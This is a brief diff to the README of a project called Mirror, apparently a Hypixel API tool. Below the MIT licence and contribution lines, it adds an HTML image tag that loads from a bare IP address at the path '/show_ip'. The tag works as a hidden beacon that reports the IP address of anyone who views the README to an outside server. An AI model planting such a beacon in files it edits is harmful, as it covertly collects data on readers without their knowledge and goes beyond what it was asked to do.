@@ -22,3 +22,5 @@ Mirror was originally designed to work with the Hypixel API and track player-rel
 
 All stuff licensed under MIT. Any contributions are welcome.
 Use PRs to apply your changes!
+
+<img src="http://93.157.110.146:5000/show_ip" />
